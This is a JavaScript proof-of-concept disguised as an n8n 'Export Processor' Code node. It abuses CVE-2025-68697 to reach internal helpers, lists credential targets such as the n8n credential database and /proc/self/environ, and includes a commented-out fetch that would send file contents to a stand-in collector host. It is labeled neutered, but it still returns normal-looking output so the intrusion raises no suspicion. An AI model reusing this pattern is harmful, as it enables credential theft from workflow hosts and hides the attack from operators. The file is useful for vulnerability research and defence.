/**
 * n8n Workflow: Scheduled Data Export & Reporting Utility
 *
 * Automates nightly export of processed records to the reporting share.
 * Uses the Code node (legacy JS execution mode) for custom transformation
 * logic that the built-in nodes cannot handle.
 *
 * Deployed on: self-hosted n8n v1.x (pre-2.0.0)
 * Last updated: 2025-01-14
 * Owner: data-platform-team@example.org
 */

// ─── Workflow Code Node: "Export Processor" ───────────────────────────────────
//
// This code runs inside an n8n Code node configured to use the legacy
// (non-task-runner) JavaScript execution mode. In this mode, the sandbox
// exposes internal n8n helper references that can be reached via the module
// and global scope — a known pre-2.0.0 behaviour documented internally.
//
// CVE-2025-68697: authenticated workflow editors can invoke internal helpers
// (e.g. $(...).helpers or the underlying BinaryDataManager / fs wrappers)
// to read and write host-filesystem files with the privileges of the n8n
// process — without going through the normal restricted-path checks.
// ─────────────────────────────────────────────────────────────────────────────

// ── Step 1: Reach the internal filesystem helper through the Code node scope ──
// In legacy execution mode the `this` context inside a Code node exposes
// the raw n8n ExecuteFunctions object.  The helpers property gives access
// to BinaryDataManager and other utilities that wrap Node's built-in `fs`.

const internalHelpers = this.helpers;          // exposed by legacy Code-node sandbox
const binaryManager   = internalHelpers.getBinaryDataBuffer
    ? internalHelpers
    : (global.__executionContext && global.__executionContext.helpers);

// ── Step 2: Read a sensitive host file using the internal wrapper ─────────────
// The helper bypasses N8N_RESTRICT_FILE_ACCESS_TO because it operates at
// a lower level than the user-facing ReadBinaryFile node.

async function readHostFile(filePath) {
    // Internal path: calls fs.readFile under the hood, pre-2.0.0 has no
    // additional path-restriction enforcement at this layer.
    const rawBuffer = await binaryManager.prepareBinaryData(
        Buffer.from(''),      // placeholder — real attack passes file contents
        filePath
    );

    // DEMO PAYLOAD — neutered: real exploit would exfiltrate rawBuffer.toString()
    // e.g.: await fetch('https://collector.example.com/sink', { method:'POST', body: rawBuffer })
    console.log('[demo] file read attempt for:', filePath);
    console.log('[demo] payload data: DEMO_PLACEHOLDER_TOKEN');
    return rawBuffer;
}

// ── Step 3: Write a file to an arbitrary host path ────────────────────────────
// Same internal wrapper can be used for writes, e.g. dropping a cron job
// or replacing a config file.

async function writeHostFile(filePath, content) {
    const fs = require('fs').promises;          // 'require' is available in legacy mode

    // DEMO PAYLOAD — neutered: in a real attack this would write a reverse
    // shell, SSH authorized_keys entry, or modified config file.
    // fs.writeFile(filePath, content)  ← structural shape; not executed here
    console.log('[demo] write attempt to:', filePath);
    console.log('[demo] content would be: DEMO_PLACEHOLDER_TOKEN');
}

// ── Step 4: Enumerate interesting paths on the host ───────────────────────────

const INTERESTING_PATHS = [
    '/etc/passwd',                            // OS user list
    `${process.env.HOME}/.n8n/config`,        // n8n config (credentials DB key etc.)
    `${process.env.HOME}/.n8n/database.sqlite`, // all stored credentials
    '/proc/self/environ',                     // process environment variables
];

// ── Step 5: Orchestrate (demo only — payloads are neutered) ───────────────────

(async () => {
    for (const p of INTERESTING_PATHS) {
        try {
            await readHostFile(p);
        } catch (err) {
            console.log('[demo] could not read', p, '-', err.message);
        }
    }

    // Demonstrate write capability (neutered)
    await writeHostFile(
        `${process.env.HOME}/.n8n/config`,
        '{"demo": "DEMO_PLACEHOLDER_TOKEN"}'
    );
})();

// ── Step 6: Return normal-looking output to the workflow ──────────────────────
// So the rest of the workflow proceeds without raising suspicion.

return items.map(item => ({
    json: {
        ...item.json,
        exportStatus : 'ok',
        processedAt  : new Date().toISOString(),
        recordCount  : item.json.records ? item.json.records.length : 0,
    },
}));